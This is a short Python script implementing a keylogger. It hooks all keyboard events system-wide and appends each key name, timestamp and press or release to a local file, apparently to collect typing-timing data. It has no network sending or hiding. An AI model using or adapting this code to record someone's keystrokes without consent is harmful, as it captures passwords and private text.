import keyboard  # for keylogs
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime

currentFile = "keylog.txt"
registerRelease = True
registerPress = False

class Keylogger:
	def __init__(self):
		# this is the string variable that contains the log of all
		# the keystrokes within `self.interval`
		self.log = ""
		self.start_dt = datetime.now()
		self.end_dt = datetime.now()


	def callback(self, event):
		if (event.event_type == 'up' and registerRelease):
			self.register_release(event)
		elif (event.event_type == 'down' and registerPress):
			self.register_press(event)

	def register_press(self, event):
		file = open(currentFile, 'a')
		name = event.name
		keyEvent = name + ' ' + str(event.time) + ' Press' + "\n"
		file.write(keyEvent)

	def register_release(self, event):
		file = open(currentFile, 'a')
		name = event.name
		keyEvent = name + ' ' + str(event.time) + ' Release' + "\n"
		file.write(keyEvent)

	def start(self):
		self.start_dt = datetime.now()
		# start the keylogger
		keyboard.hook(callback=self.callback)
		# block the current thread, wait until CTRL+C is pressed
		keyboard.wait()


if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
